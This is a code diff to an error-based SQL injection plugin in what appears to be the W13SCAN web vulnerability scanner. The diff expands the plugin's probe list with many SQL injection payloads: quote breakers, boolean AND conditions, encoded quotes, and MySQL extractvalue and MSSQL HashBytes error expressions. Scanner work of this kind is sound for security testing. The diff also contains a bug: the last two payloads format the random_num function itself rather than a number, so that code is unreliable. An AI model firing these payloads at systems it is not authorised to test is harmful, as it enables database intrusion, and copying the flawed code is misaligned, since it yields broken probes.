@@ -5,7 +5,7 @@
 # @File    : sqli_error.py
 
 from lib.helper.helper_sqli import Get_sql_errors
-from lib.core.common import generateResponse
+from lib.core.common import generateResponse, random_num, random_str
 from lib.core.enums import VulType
 from lib.core.plugins import PluginBase
 from lib.helper.helper_sensitive import sensitive_page_error_message_check
@@ -15,7 +15,20 @@ class W13SCAN(PluginBase):
     name = '基于报错SQL注入'
 
     def audit(self):
-        _payloads = ['鎈\'"\(']
+        num = random_num(4)
+        s = random_str(4)
+        _payloads = [
+            '鎈\'"\(',
+            "'", "')", "';", '"', '")', '";', ' order By 500 ', "--", "-0",
+            ") AND {}={} AND ({}={}".format(num, num + 1, num, num),
+            " AND {}={}%23".format(num, num + 1),
+            " %' AND {}={} AND '%'='".format(num, num + 1), " ') AND {}={} AND ('{}'='{}".format(num, num + 1, s, s),
+            " ' AND {}={} AND '{}'='{}".format(num, num + 1, s, s),
+            '`', '`)',
+            '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C",
+            "extractvalue(1,concat(char(126),md5({})))".format(random_num),
+            "convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','{}')))".format(random_num)
+        ]
         # 载入处理位置以及原始payload
         iterdatas = self.generateItemdatas()
 
